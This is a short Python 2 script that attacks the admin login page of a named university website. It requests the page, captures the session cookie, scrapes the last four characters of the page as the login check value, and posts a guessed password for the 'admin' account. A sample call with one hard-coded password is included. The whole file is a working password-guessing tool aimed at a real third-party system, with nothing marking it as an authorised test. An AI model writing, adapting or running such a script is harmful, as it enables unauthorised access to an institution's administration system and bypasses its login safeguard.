__author__ = 'bowman'
import urllib2
import re
import urllib

def get_page():
    req1 = urllib2.Request('http://tw.heuet.edu.cn/admin/login.asp')
    response = urllib2.urlopen(req1)
    cookie = response.headers.get('Set-Cookie')
    body = response.read(2081)
    #print body[-4:],'cookie',cookie
    return {'cookie':cookie,'cha':body[-4:]}

def test_pass(cookie, cha, password):
    post_dict = {'username': 'admin', 'password': password, 'otherpwd': cha}
    params = urllib.urlencode(post_dict)
    req2 = urllib2.Request('http://tw.heuet.edu.cn/admin/login.asp',params)
    req2.add_header('cookie', cookie)

    response = urllib2.urlopen(req2)
    print response.read()

def do(password):
    ret = get_page()
    test_pass(ret['cookie'],ret['cha'],password)

do(1234556)